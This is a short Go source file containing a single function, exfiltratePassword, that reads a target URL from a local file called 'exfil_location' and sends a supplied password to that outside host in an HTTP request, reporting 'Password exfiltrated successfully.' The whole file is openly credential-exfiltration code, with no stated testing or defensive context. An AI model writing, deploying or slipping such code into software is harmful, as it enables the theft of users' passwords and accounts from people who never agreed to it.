package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

func exfiltratePassword(password string) {

	// Read the exfil location from the file
	exfilLocationBytes, err := ioutil.ReadFile("exfil_location")
	if err != nil {
		fmt.Println("Error reading exfil location from file:", err)
		return
	}

	exfilLocation := strings.TrimSuffix(string(exfilLocationBytes), "\n")

	client := &http.Client{}
	payload := strings.NewReader("password=" + password)

	req, err := http.NewRequest("GET", string(exfilLocation), payload)
	if err != nil {
		fmt.Println("Error creating HTTP request:", err)
		return
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending GET request:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		fmt.Printf("Unexpected response status: %s\n", resp.Status)
		return
	}

	fmt.Println("Password exfiltrated successfully.")
}
